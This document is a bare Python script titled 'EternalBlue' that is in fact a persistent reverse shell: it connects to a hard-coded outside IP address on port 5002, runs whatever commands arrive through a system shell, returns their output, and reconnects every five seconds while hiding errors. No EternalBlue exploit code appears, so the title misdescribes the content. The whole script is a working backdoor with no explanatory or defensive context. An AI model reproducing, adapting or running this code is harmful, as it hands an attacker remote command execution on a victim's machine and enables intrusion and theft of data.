 #-+= EternalBlue =+-

def connect(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s

def process(s):
	data = s.recv(1024)
	if data == "quit":
		s.close()
		sys.exit(0)
	elif len(data)==0:
		return True
	else:
		proc = subprocess.run(data.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return False

def main():
	while True:
		socketDied=False
		try:
			s=connect("51.191.145.49",5002)
			while not socketDied:
				s.send(b"\n>> ")
				socketDied=process(s)
			s.close()
		except Exception:
			pass
		time.sleep(5)

if __name__ == "__main__":
	import sys,subprocess,socket,time
	sys.exit(main())
